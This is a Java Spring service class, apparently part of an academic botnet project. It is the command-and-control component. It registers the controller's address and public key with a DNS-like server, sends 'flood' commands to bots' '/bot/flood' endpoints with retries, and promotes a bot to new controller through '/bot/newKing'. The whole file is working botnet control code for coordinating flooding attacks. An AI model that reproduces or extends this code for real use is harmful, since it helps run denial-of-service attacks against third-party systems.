package cs.sii.network.request;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.PublicKey;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.schedule.net.ScheduledTasksNet;

@Service("CeCRequest")
public class CecRequest {
	private static final int WAIT_RANGE = 250;
	private static final String PORT = ":8443";
	private static final String HTTPS = "https://";
	private static final String HTTP = "http://";
	public final static Integer REQNUMBER = 10;
	private static final int TIMEOUT_MILLIS = 600000;
	private RestTemplate restTemplate = new RestTemplate();


	
	/**
	 * @param dnsUrl
	 * @param myIp
	 * @param myPublicKey
	 * @return
	 */
	public Boolean sendInfoToDnsServer(String dnsUrl, IP myIp ,IP cecIp, PublicKey cecPublicKey) {
		Pairs<IP, String> data = new Pairs<>();
		data.setValue1(myIp);
		String str = Base64.encodeBase64String(cecPublicKey.getEncoded());
		data.setValue2(str);
		return sendInfoToDnsServer(dnsUrl, myIp, cecIp,str);
	}

	/**
	 * @param dnsUrl
	 * @param myIp
	 * @param myPublicKey
	 * @return
	 */
	public Boolean sendInfoToDnsServer(String dnsUrl,IP myIp ,IP cecIp, String cecPublicKey) {
		Pairs<IP,Pairs<IP, String>> data = new Pairs<>();
		data.setValue1(myIp);
		Pairs<IP,String> newCec=new Pairs<IP, String>(cecIp, cecPublicKey);
		data.setValue2(newCec);
		
		
		Boolean response = false;
		while (true) {
			try {
				String url = dnsUrl + "/alter";
				System.out.println("url " + url);
				response = restTemplate.postForObject(url, data, response.getClass());
				if (response != null)
					System.out.println(response);
				return response;
			} catch (Exception e) {
				System.out.println("Errore Aggiornamento DNS");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	@Async
	public Boolean sendFloodToBot(String ipBot, String msg) {
		Boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ipBot + PORT + "/bot/flood";
				System.out.println("url bot flood" + url);
				response = restTemplate.postForObject(url, msg, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore invio richiesta flood");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
			
		return response;
	}

	public boolean becameCc(String ip) {
		Boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/bot/newKing";
				response = restTemplate.postForObject(url, null, response.getClass());
				return response;
			} catch (Exception e) {
				System.out.println("Errore invio richiesta kingsivcuuto");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	// allinea CeC se piu di uno

}
